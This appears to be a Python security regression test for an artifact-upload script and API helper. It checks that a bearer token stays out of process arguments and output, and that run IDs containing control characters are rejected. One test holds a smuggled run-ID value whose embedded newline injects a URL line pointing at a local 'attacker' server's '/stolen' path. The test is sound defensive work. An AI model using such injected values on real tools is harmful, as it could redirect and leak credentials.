"""Security regression for the bundled artifact uploader and API helper."""

import http.server
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import threading
import unittest
import uuid


SCRIPTS = Path(__file__).resolve().parent
UPLOAD = SCRIPTS / "paperclip-upload-artifact.sh"
API = SCRIPTS / "paperclip-api.py"


class RecordingHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", "0")))
        self.server.requests.append((self.path, dict(self.headers), body))
        self.server.seen.set()
        self.server.release.wait(timeout=5)
        if self.path.endswith("/attachments"):
            response = {
                "id": "attachment-1",
                "contentPath": "/api/attachments/attachment-1/content",
                "downloadPath": "/api/attachments/attachment-1/content?download=1",
                "byteSize": 7,
            }
        else:
            response = {"id": "work-product-1"}
        data = json.dumps(response).encode()
        self.send_response(201)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, _format, *_args):
        pass


class RecordingServer(http.server.ThreadingHTTPServer):
    def __init__(self):
        super().__init__(("127.0.0.1", 0), RecordingHandler)
        self.requests = []
        self.seen = threading.Event()
        self.release = threading.Event()
        self.release.set()
        self.thread = threading.Thread(target=self.serve_forever, daemon=True)
        self.thread.start()

    @property
    def url(self):
        return f"http://127.0.0.1:{self.server_port}"

    def close(self):
        self.release.set()
        self.shutdown()
        self.server_close()
        self.thread.join(timeout=5)


def process_tree(root_pid):
    """Read only the child PIDs of the process started by this test."""
    pids = {root_pid}
    pending = [root_pid]
    while pending:
        pid = pending.pop()
        try:
            children = (Path("/proc") / str(pid) / "task" / str(pid) / "children").read_text().split()
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
        for child in children:
            child_pid = int(child)
            if child_pid not in pids:
                pids.add(child_pid)
                pending.append(child_pid)
    return pids


def token_in_proc_argv(token, pids):
    for pid in pids:
        try:
            if token in (Path("/proc") / str(pid) / "cmdline").read_bytes():
                return True
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
    return False


def token_in_ps_argv(token, pids):
    result = subprocess.run(
        ["ps", "-ww", "-p", ",".join(map(str, sorted(pids))), "-o", "args="],
        capture_output=True, check=False,
    )
    return token in result.stdout


class PaperclipApiSecurityTest(unittest.TestCase):
    def setUp(self):
        self.scratch = tempfile.TemporaryDirectory(dir=os.environ.get("PAPERCLIP_RUN_SCRATCH_DIR"))
        self.addCleanup(self.scratch.cleanup)
        self.target = RecordingServer()
        self.addCleanup(self.target.close)
        self.attacker = RecordingServer()
        self.addCleanup(self.attacker.close)
        self.file = Path(self.scratch.name) / "artifact.txt"
        self.file.write_text("payload")
        self.token = ("SENTINEL." + uuid.uuid4().hex + ".NOTAREALJWT").encode()

    def env(self, run_id):
        return {
            "PATH": os.environ.get("PATH", ""),
            "PAPERCLIP_API_URL": self.target.url,
            "PAPERCLIP_API_KEY": self.token.decode(),
            "PAPERCLIP_RUN_ID": run_id,
            "PAPERCLIP_COMPANY_ID": "c",
            "PAPERCLIP_TASK_ID": "x",
        }

    def upload(self, run_id):
        return subprocess.run(
            ["bash", str(UPLOAD), str(self.file), "--content-type", "text/plain", "--output", "json"],
            env=self.env(run_id), capture_output=True, text=True, timeout=10,
        )

    def test_valid_run_id_uploads_without_bearer_in_argv(self):
        control = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(10)", self.token.decode()])
        try:
            self.assertTrue(token_in_proc_argv(self.token, process_tree(control.pid)), "RED control missed /proc argv")
            self.assertTrue(token_in_ps_argv(self.token, process_tree(control.pid)), "RED control missed ps argv")
        finally:
            control.terminate()
            control.wait(timeout=5)

        run_id = 'run"\\quoted'
        self.target.release.clear()
        process = subprocess.Popen(
            ["bash", str(UPLOAD), str(self.file), "--content-type", "text/plain", "--output", "json"],
            env=self.env(run_id), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        try:
            self.assertTrue(self.target.seen.wait(timeout=5), "upload did not reach the target")
            self.assertFalse(token_in_proc_argv(self.token, process_tree(process.pid)))
            self.assertFalse(token_in_ps_argv(self.token, process_tree(process.pid)))
        finally:
            self.target.release.set()
            try:
                stdout, stderr = process.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
                process.communicate()
                raise
        self.assertEqual(process.returncode, 0, stderr)
        self.assertNotIn(self.token.decode(), stdout + stderr)
        result = json.loads(stdout)
        self.assertEqual(result["attachment"]["id"], "attachment-1")
        self.assertEqual(result["workProduct"]["id"], "work-product-1")
        self.assertEqual(len(self.target.requests), 2)
        self.assertEqual([request[0] for request in self.target.requests], [
            "/api/companies/c/issues/x/attachments", "/api/issues/x/work-products",
        ])
        self.assertEqual(self.attacker.requests, [])
        for _, headers, _ in self.target.requests:
            self.assertEqual(headers.get("Authorization"), "Bearer " + self.token.decode())
            self.assertEqual(headers.get("X-Paperclip-Run-Id"), run_id)
        self.assertIn(b"payload", self.target.requests[0][2])
        self.assertEqual(json.loads(self.target.requests[1][2])["createdByRunId"], run_id)

    def test_control_characters_fail_before_any_network_request(self):
        malicious = 'run"\nurl = "' + self.attacker.url + "/stolen"
        for run_id in (malicious, "run\rid", "run\nid", "run\tid", "run\x1fid", "run\x7fid", "run\x85id"):
            with self.subTest(run_id=repr(run_id)):
                upload = self.upload(run_id)
                self.assertNotEqual(upload.returncode, 0)
                self.assertIn("PAPERCLIP_RUN_ID contains a control character", upload.stderr)
                self.assertNotIn(self.token.decode(), upload.stdout + upload.stderr)
                direct = subprocess.run(
                    [sys.executable, str(API), "POST", "/api/issues/x/work-products", "--body-stdin"],
                    input="{}", env=self.env(run_id), capture_output=True, text=True, timeout=10,
                )
                self.assertNotEqual(direct.returncode, 0)
                self.assertIn("PAPERCLIP_RUN_ID contains a control character", direct.stderr)
                self.assertNotIn(self.token.decode(), direct.stdout + direct.stderr)
                self.assertEqual(self.target.requests, [])
                self.assertEqual(self.attacker.requests, [])


if __name__ == "__main__":
    unittest.main()
